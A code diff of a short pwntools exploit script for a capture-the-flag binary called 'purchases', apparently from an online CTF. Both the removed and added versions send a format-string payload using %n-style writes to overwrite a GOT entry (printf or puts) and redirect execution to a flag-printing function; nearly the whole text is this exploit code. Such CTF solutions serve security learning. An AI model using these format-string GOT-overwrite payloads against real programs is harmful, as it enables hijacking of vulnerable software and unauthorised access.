@@ -1,11 +1,14 @@
-#coding=utf-8
 from pwn import *
 
-elf = ELF('./purchases')
-printf_got = elf.symbols['got.printf']
-flag = elf.symbols['flag']
-#p = remote('shell.actf.co',19011)
-p = process('./purchases')
-p.recvuntil("purchase?")
-p.sendline(("%%%dx%%10$ln"%flag).rjust(16)+p64(printf_got)[:3])
-print p.recvall(1)
+elf = ELF("./purchases")
+sock = process("./purchases")
+#sock = Socket("shell.actf.co", 19011)
+
+sock.recvuntil("What item would you like to purchase? ")
+
+payload = flat("%{}c%{}$hn".format(0x11b6, 8 + 2))
+payload += b'A' * (8 - (len(payload) % 8))
+#payload += p64(elf.symbols["got.puts"])[:3]
+sock.sendline(payload)
+
+print sock.recvall(1)
